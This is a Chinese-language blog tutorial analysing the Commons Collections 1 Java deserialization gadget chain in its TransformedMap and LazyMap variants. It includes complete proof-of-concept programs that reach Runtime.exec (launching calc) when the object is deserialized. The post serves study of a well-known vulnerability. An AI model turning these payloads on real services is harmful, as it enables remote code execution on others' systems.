---
title: CommonsCollections1
subtitle:
date: 2025-02-02T03:14:26+08:00
slug: commons-collections-1
draft: false
author:
  name: M1ng2u
  link:
  email:
  avatar:
description:
keywords: CC1
license:
comment: true
weight: 0
tags:
  - Java反序列化
  - CC1
categories:
  - JavaSec
collections:
  - CommonsCollections
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: true
lightgallery: false
password:
message:
repost:
  enable: true
  url:

---

# CommonsCollections1

CC1的漏洞触发点在 `org.apache.commons.collections.functors.InvokerTransformer::transform()` 

![](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808151725056.png)

这里使用了反射调用，若 `iMethodName` , `iParamTypes` , `iArgs` 可控，则可以调用任意方法，并可传入任意参数

其构造器如下

![image-20250808151853546](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808151853586.png)

调用一下试试看

```Java
new InvokerTransformer("exec", new Class[] {String.class}, new String[] {"calc"}).transform(Runtime.getRuntime());
```

## TransformedMap 利用链

### Analyze

这条链子里调用 `transform()` 方法的是 `org.apache.commons.collections.map.TransformedMap::checkSetValue()`

> `transformKey()` 和 `transformValue()` 方法也会调用，但是没有调用这两个方法的 `Serializable` 类

![image-20250808152902479](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808152902521.png)

查看构造器可发现 `valueTransformer` 可控

![image-20250808153042296](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808153042334.png)

但由于构造器有 `protected` 修饰，所以无法直接调用，故使用 `decorate` 方法间接调用

![image-20250808153301573](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808153301607.png)

到这里已经可以外部控制 `valueTransformer` ，下面寻找哪里调用了 `checkSetValue()` 方法

在抽象类 `AbstractInputCheckedMapDecorator` 可以看到，`setValue()` 方法调用了 `checkSetValue()`

对此构造一个 payload 进行测试

```Java
InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[] {String.class}, new String[] {"calc"});

Map<Object, Object> innerMap = new HashMap<>();
innerMap.put("key", "mzzz");

Map<Object, Object> outerMap = TransformedMap.decorate(innerMap, null, invokerTransformer);

for (Map.Entry<Object, Object> e : outerMap.entrySet()) {
    e.setValue(Runtime.getRuntime());
}
```

成功弹出计算器，但是 `Runtime` 没有实现 `Serializable` 接口，无法直接在反序列化过程中调用 `Runtime.getRuntime()` ，因此利用 `ChainedTransformer` ，更改 payload 如下

```Java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
        new InvokerTransformer("exec", new Class[] {String.class}, new String[] {"calc"}),
};

Transformer transformerChain = new ChainedTransformer(transformers);
        
Map<Object, Object> innerMap = new HashMap<>();
innerMap.put("key", "mzzz");

Map<Object, Object> outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

for (Map.Entry<Object, Object> e : outerMap.entrySet()) {
    e.setValue(Runtime.getRuntime());
}
```

最后需要找一个调用了 `setValue()` 方法的反序列化点

使用 `sun.reflect.annotation.AnnotationInvocationHandler`

![image-20250808170345477](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808170345610.png)

查看构造器，没有修饰符，所以是包可见，因此只能反射调用

![image-20250808173345003](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808173345049.png)

```Java
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);
```

两个参数，第一个要求传入一个注解类型的 `Class` 对象，这里传 `Retention.class` （其他的也行），第二个传入构造的 `map`

### Payload

```java
package javaSec.Ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

public class CommonsColletions1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, new String[] {"calc"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map<Object, Object> innerMap = new HashMap<>();
        innerMap.put("value", "mzzz");

        Map<Object, Object> outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler);
        oos.close();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        
    }
}
```

> Q: 为什么构造 `innerMap` 时要将 `key` 设为 `"value"` ?
>
> A: `AnnotationInvocationHandler` 要求传入的 `memberValues` 这个 `Map` 的键要与注解示例的元素（方法）名一致，而值为对应的取值，`java.lang.annotaion.Retention` 只有一个元素 `value`
>
> 所以为了成功反序列化触发链子，必须要传入注解类中有的元素

### Gadgets

```text
ObjectInputStream.readObject()
	AnnotationInvocationHandler.readObject()
		Map(Proxy).entrySet()
			AnnotationInvocationHandler.invoke()
				TransformedMap.setValue()
					TransformedMap.checkSetValue()
						ChainedTransformer.transform()
							ConstantTransformer.transform()
							InvokerTransformer.transform()
								Method.invoke()
									Class.getMethod()
							InvokerTransformer.transform()
								Method.invoke()
									Runtime.getRuntime()
							InvokerTransformer.transform()
								Method.invoke()
									Runtime.exec()
									
```



## LazyMap 利用链

### Analyze

其他部分都是一样的，这里主要分析触发 `transform` 的不同方式

![image-20250808175641557](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808175641604.png)

很明显触发 `transform()` 的条件是 `Lazymap.get(key)` 时传入一个不存在的 `key`

简单测试一下

```Java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
        new InvokerTransformer("exec", new Class[] {String.class}, new String[] {"calc"}),
};

Transformer transformerChain = new ChainedTransformer(transformers);

Map<Object, Object> innerMap = new HashMap<>();

Map<Object, Object> outerMap = LazyMap.decorate(innerMap, transformerChain);

//outerMap.get("value");
outerMap.get("baka");
```

成功弹计算器，那如何调用到 `Lazymap.get()` 呢？

首先看到 `AnnotationInvocationHandler` 的 `readObject()` 方法中调用了 `get()` ，但是否可控呢？

![image-20250808181444439](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808181444576.png)

顺着往前找，调用的是 `memberTypes()` 的 `get()` ，而 `memberTypes()` 本质上是 `AnnotationType` 在运行时扫描注解类时返回的一张按 `元素名->返回类型` 的只读映射，不可控

但我们可以另外找到 `AnnotationInvocationHandler` 的 `invoke()` 方法中调用了 `memberValues.get()` ，且 `memberValues` 外部可控

![image-20250808181857475](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808181857540.png)

要执行到这一步 `get()` ，`AnnotationInvocationHandler` 执行的方法要是无参的

而在 `readObject()` 中恰好有无参方法的执行

![image-20250808182637558](https://mingzu.oss-cn-hongkong.aliyuncs.com/blog/20250808182637602.png)

先进行测试，将 `AnnotationInvocationHandler` 动态代理，执行无参方法，从而调用 `LazyMap.get()` ，触发链子执行

```Java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
        new InvokerTransformer("exec", new Class[] {String.class}, new String[] {"calc"}),
        };

Transformer transformerChain = new ChainedTransformer(transformers);

Map<Object, Object> innerMap = new HashMap<>();
Map<Object, Object> outerMap = LazyMap.decorate(innerMap, transformerChain);

Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);

Map<Object, Object> proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
proxyMap.entrySet(); // 测试任意无参方法
```

成功弹计算器，那么再套一层 `AnnotationInvocationHandler` ，达成的结果就是

反序列化时： `AIH_2.memberValues` -> `proxyMap` ，调用 `proxyMap.entrySet()` ，方法被转发到 `AIH_1.invoke()` ，调用无参方法，调用 `LazyMap.get()` ，触发链子

### Payload

```java
package javaSec.Ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsColletions1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, new String[] {"calc"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map<Object, Object> innerMap = new HashMap<>();
        Map<Object, Object> outerMap = LazyMap.decorate(innerMap, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);

        Map<Object, Object> proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler);
        oos.close();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();

    }
}
```

### Gadget Chain

```text
ObjectInputStream.readObject()
	AnnotationInvocationHandler.readObject()
		Map(Proxy).entrySet()
			AnnotationInvocationHandler.invoke()
				LazyMap.get()
					ChainedTransformer.transform()
						ConstantTransformer.transform()
						InvokerTransformer.transform()
							Method.invoke()
								Class.getMethod()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.getRuntime()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()				
								
